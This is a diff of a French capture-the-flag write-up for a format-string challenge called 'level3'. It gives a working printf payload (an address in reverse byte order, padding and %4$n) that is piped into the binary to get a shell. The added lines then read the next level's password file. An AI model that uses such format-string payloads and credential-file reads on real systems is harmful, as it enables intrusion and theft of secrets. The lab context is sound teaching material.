@@ -18,4 +18,6 @@ Au final, on écrit les 4 octets correspondant à l'adresse, en ordre inverse
 à cause de la stack, et 60 'a', pour obtenir une chaîne de 64 octets de long. 
 Pour accéder au shell, on fait :
 echo -e '\x8c\x98\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%4$n' > /tmp/level3 && cat /tmp/level3 - | ./level3
+
 On récupère ensuite le flag comme d'habitude. 
+cat /home/user/level4/.pass
